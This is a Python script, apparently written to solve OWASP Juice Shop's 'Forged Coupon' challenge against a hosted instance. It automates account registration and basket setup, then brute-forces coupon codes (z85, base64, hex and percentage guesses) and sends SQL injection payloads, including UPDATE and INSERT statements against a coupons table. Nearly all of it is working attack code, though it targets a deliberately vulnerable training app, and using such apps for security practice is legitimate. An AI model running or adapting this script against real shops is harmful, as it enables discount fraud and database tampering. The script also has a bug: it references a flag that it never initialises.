#!/usr/bin/env python3
"""
Ultimate Coupon Solver - Complete Ultrathink Solution
====================================================
Final comprehensive approach to solve the Forged Coupon Challenge
Requirement: Find coupon code giving 80%+ discount

Usage:
    python3 ultimate_coupon_solver.py [url]
"""

import requests
import json
import time
import sys
import base64
import urllib.parse
from urllib.parse import urljoin

class Colors:
    HEADER = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class UltimateCouponSolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.token = None
        self.basket_id = None

    def setup_complete_session(self):
        """Complete session setup with proper basket handling"""
        print(f"{Colors.CYAN}🔧 Complete session setup...{Colors.ENDC}")

        # Step 1: Register user
        timestamp = str(int(time.time()))
        email = f"ultimate{timestamp}@test.com"
        password = f"Ultimate123!{timestamp}"

        register_data = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
            "securityAnswer": "test"
        }

        try:
            register_response = self.session.post(f"{self.base_url}/api/Users/", json=register_data)
            print(f"   Registration: {register_response.status_code}")
        except:
            pass

        # Step 2: Login
        login_response = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": email,
            "password": password
        })

        if login_response.status_code != 200:
            print(f"{Colors.RED}❌ Login failed{Colors.ENDC}")
            return False

        auth_data = login_response.json()
        self.token = auth_data.get('authentication', {}).get('token')

        if not self.token:
            print(f"{Colors.RED}❌ No token received{Colors.ENDC}")
            return False

        self.session.headers['Authorization'] = f'Bearer {self.token}'
        print(f"{Colors.GREEN}✅ Authentication complete{Colors.ENDC}")

        # Step 3: Add multiple products to create substantial basket
        products_response = self.session.get(f"{self.base_url}/rest/products/search")
        if products_response.status_code != 200:
            return False

        products = products_response.json().get('data', [])
        if not products:
            return False

        print(f"   Adding {min(3, len(products))} products to basket...")

        # Add first 3 products
        for i, product in enumerate(products[:3]):
            basket_response = self.session.post(f"{self.base_url}/api/BasketItems/", json={
                "ProductId": product['id'],
                "quantity": i + 1
            })
            print(f"   Product {product['id']}: {basket_response.status_code}")

        # Step 4: Get proper basket ID
        time.sleep(1)  # Wait for basket to be fully created
        whoami_response = self.session.get(f"{self.base_url}/rest/user/whoami")

        if whoami_response.status_code == 200:
            user_data = whoami_response.json().get('user', {})
            self.basket_id = user_data.get('bid') or user_data.get('id', 1)
            print(f"   Final basket ID: {self.basket_id}")

            # Verify basket exists and has products
            basket_check = self.session.get(f"{self.base_url}/rest/basket/{self.basket_id}")
            if basket_check.status_code == 200:
                basket_data = basket_check.json().get('data', {})
                product_count = len(basket_data.get('Products', []))
                print(f"   Verified basket with {product_count} products")
                return True

        print(f"{Colors.RED}❌ Basket verification failed{Colors.ENDC}")
        return False

    def test_coupon_with_validation(self, coupon_code):
        """Test coupon with full validation"""
        if not self.basket_id:
            return False

        try:
            coupon_url = f"{self.base_url}/rest/basket/{self.basket_id}/coupon/{coupon_code}"
            response = self.session.put(coupon_url, json={})

            if response.status_code == 200:
                result = response.json()
                discount = result.get('discount', 0)

                if discount and discount >= 80:
                    print(f"{Colors.GREEN}🎉 CHALLENGE SOLVED! {coupon_code} = {discount}% discount!{Colors.ENDC}")
                    return True
                elif discount > 0:
                    print(f"{Colors.YELLOW}Valid but insufficient: {coupon_code} = {discount}% (need 80%+){Colors.ENDC}")

            return False

        except Exception:
            return False

    def comprehensive_search(self):
        """Comprehensive search for 80%+ discount coupons"""
        print(f"\n{Colors.CYAN}🧠 ULTRATHINK: Comprehensive 80%+ coupon search...{Colors.ENDC}")

        tested = 0

        # 1. Test known high-value patterns
        high_value_patterns = [
            # z85 patterns
            "z85!4LdF", "z85!5m1", "z85!9MA", "pes[Bh", "n<Mop4",

            # Base64 high discounts
            "ODAl", "ODVs", "OTAl", "MVAwJQ",

            # Percentage codes
            "80OFF", "90OFF", "100OFF", "FREE100", "MEGA90",

            # Hex high values
            "50", "5A", "64", "80", "90", "FF",

            # Found codes
            "8343D2", "PROMOTION",

            # Manual z85 attempts
            "z85!@#", "z85!A1", "z85!B2", "z85!C3",
        ]

        print(f"Testing {len(high_value_patterns)} high-value patterns...")
        for code in high_value_patterns:
            tested += 1
            if self.test_coupon_with_validation(code):
                return True

        # 2. Generate mathematical combinations
        print(f"\n{Colors.CYAN}Generating mathematical discount patterns...{Colors.ENDC}")

        for percentage in [80, 85, 90, 95, 100]:
            codes_to_try = [
                str(percentage),
                f"SAVE{percentage}",
                f"DISCOUNT{percentage}",
                f"FREE{percentage}",
                f"GET{percentage}",
                hex(percentage)[2:].upper(),
                f"{percentage}OFF",
                f"{percentage}PCT"
            ]

            for code in codes_to_try:
                tested += 1
                if self.test_coupon_with_validation(code):
                    return True

        # 3. Try URL manipulation and SQL injection
        if self.is_juice_shop:
            print(f"\n{Colors.CYAN}SQL injection for high discount...{Colors.ENDC}")

            sql_patterns = [
                "' OR discount >= 80 --",
                "'; UPDATE coupons SET discount = 90; --",
                "' UNION SELECT 90 as discount --",
                f"'; INSERT INTO coupons VALUES('HACKED90', 90); --",
            ]

            for payload in sql_patterns:
                encoded = urllib.parse.quote(payload)
                tested += 1
                if self.test_coupon_with_validation(encoded):
                    return True

        print(f"{Colors.YELLOW}Tested {tested} patterns, no 80%+ coupons found{Colors.ENDC}")
        return False

    def solve(self):
        """Main solve method"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}🎯 ULTIMATE FORGED COUPON SOLVER{Colors.ENDC}")
        print(f"{Colors.HEADER}Targeting: 80%+ discount requirement{Colors.ENDC}\n")

        # Detect Juice Shop
        try:
            response = self.session.get(self.base_url)
            if 'owasp juice shop' in response.text.lower():
                self.is_juice_shop = True
                print(f"{Colors.GREEN}✅ Juice Shop detected{Colors.ENDC}")
            else:
                print(f"{Colors.YELLOW}⚠️  Non-standard target{Colors.ENDC}")
        except:
            print(f"{Colors.RED}❌ Cannot reach target{Colors.ENDC}")
            return False

        # Complete setup
        if not self.setup_complete_session():
            return False

        # Comprehensive search
        return self.comprehensive_search()

def main():
    """Main with interactive prompts"""
    print(f"{Colors.HEADER}🧠 ULTIMATE COUPON SOLVER - ULTRATHINK MODE{Colors.ENDC}\n")

    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        print(f"Default target: https://juice5.wonkatech.org")
        choice = input(f"Use default? (y/n): ").strip().lower()
        if choice == 'n':
            url = input("Enter Juice Shop URL: ").strip()
        else:
            url = "https://juice5.wonkatech.org"

    solver = UltimateCouponSolver(url)
    success = solver.solve()

    if success:
        print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 FORGED COUPON CHALLENGE COMPLETED!{Colors.ENDC}")
    else:
        print(f"\n{Colors.RED}Challenge requires manual analysis{Colors.ENDC}")
        print(f"{Colors.CYAN}The 80%+ discount requirement suggests specific code needed{Colors.ENDC}")

if __name__ == '__main__':
    main()